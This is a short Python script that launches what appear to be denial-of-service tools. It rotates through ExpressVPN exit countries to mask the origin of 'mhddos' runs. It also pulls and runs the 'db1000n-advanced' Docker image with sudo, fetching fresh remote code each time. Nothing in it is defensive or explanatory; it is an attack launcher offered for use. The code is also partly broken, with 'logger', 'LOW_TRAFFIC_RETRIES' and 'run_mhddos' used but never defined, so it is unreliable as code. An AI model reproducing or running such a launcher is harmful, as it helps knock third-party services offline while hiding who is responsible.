#!/usr/bin/env python3

import random
import subprocess
from contextlib import contextmanager

from utils import setup_logger


VPN_LOCATIONS = [
    "is", "no", "dk", "be", "fi", "gr", "pt", "at", "am", "pl", "lt", "ee", "cz", "ad", "me", "ba", "lu", "hu", "bg",
    "by", "mt", "li", "cy", "al", "hr", "si", "sk", "mc", "je", "mk", "md", "rs", "ge", "za", "il", "eg", "ke", "dz",
]


@contextmanager
def vpn(location):
    logger.info("Connecting to: %s", location)
    subprocess.check_call(["expressvpn", "connect", location], stderr=subprocess.STDOUT)
    yield
    logger.info("Disconnecting from: %s", location)
    subprocess.check_call(["expressvpn", "disconnect"], stderr=subprocess.STDOUT)


def vpn_loop(args):
    random.shuffle(VPN_LOCATIONS)
    for location in VPN_LOCATIONS[:LOW_TRAFFIC_RETRIES]:
        with vpn(location):
            run_mhddos(logger, args)


def run_db1000n(logger):
    process = subprocess.Popen(
        [
            "sudo",
            "docker", "run",
            "--rm", "-it",
            "--pull", "always",
            "ghcr.io/arriven/db1000n-advanced",
        ],
        stderr=subprocess.STDOUT,
        stdout=subprocess.PIPE,
        text=True,
    )
    for line in process.stdout:
        logger.info("%s", line.strip())


def main():
    logger = setup_logger("DB1000N")
    run_db1000n(logger)


if __name__ == "__main__":
    main()
